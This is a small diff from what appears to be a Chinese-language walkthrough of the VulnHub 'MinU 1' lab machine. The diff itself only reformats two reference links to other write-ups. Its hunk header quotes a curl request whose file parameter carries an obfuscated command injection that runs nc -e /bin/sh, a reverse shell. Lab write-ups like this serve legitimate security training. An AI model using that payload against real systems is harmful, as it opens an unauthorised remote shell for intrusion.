@@ -74,5 +74,5 @@ curl -s 'http://192.168.145.5/test.php?file=%26/b?n/nc$u%20-e%20/b?n/sh$u%20192.
     ![Full-width image](/assets/img/docs/MlnUV1/29.png)
 >
 **附上参考的两位大佬的解析地址**:
-+ [1]:https://medium.com/@honze_net/vulnhub-minu-1-write-up-8032fdda5939
-+ [2]:https://hackso.me/minu-1-walkthrough/
++ https://medium.com/@honze_net/vulnhub-minu-1-write-up-8032fdda5939
++ https://hackso.me/minu-1-walkthrough/
